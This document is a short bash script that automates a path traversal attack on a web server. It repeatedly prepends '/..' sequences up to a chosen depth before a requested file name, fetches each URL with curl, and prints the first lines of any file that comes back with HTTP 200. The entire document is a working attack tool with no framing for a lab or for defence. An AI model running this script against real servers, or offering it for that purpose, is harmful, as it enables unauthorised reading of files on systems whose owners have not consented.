#!/bin/bash

if [ $# -ne 3 ]; then
  echo "usage : ./traversal.bash 'target_url' 'file_to_access' 'max_depth'"
  exit 1
fi

TARGET=$1
FILE_NAME=$2
MAX_DEPTH=$3
PAYLOAD=""
FULL_URL=""
RESPONSE=""
SAVED_OUTPUT="header_response.txt"

GREEN="\033[1;92m"
RED="\033[0;31m"
NC="\033[0m"

for  ((i=1; i<= MAX_DEPTH; i++))
  do
    PAYLOAD=""
    for ((j=1; j<=i; j++))
      do
        PAYLOAD+="/.."
      done

      FULL_URL="${TARGET}${PAYLOAD}${FILE_NAME}"
 
      echo "[$i] Trying exploring -> ${PAYLOAD}${FILE_NAME}"

      RESPONSE_HTTP_CODE=$(curl -s -o $SAVED_OUTPUT -w "%{http_code}" "$FULL_URL")

      if [ "$RESPONSE_HTTP_CODE" -eq 200 ]; then
        echo -e "${GREEN} [$i] ACCESSED : http_reponse_code = 200 ok, successfully accessed file "$FULL_URL" ${NC}"
        head -n 20 $SAVED_OUTPUT
        exit 0
      fi
  done       

  echo -e "${RED} could not access the file $FILE_NAME within depth $MAX_DEPTH ${NC}"
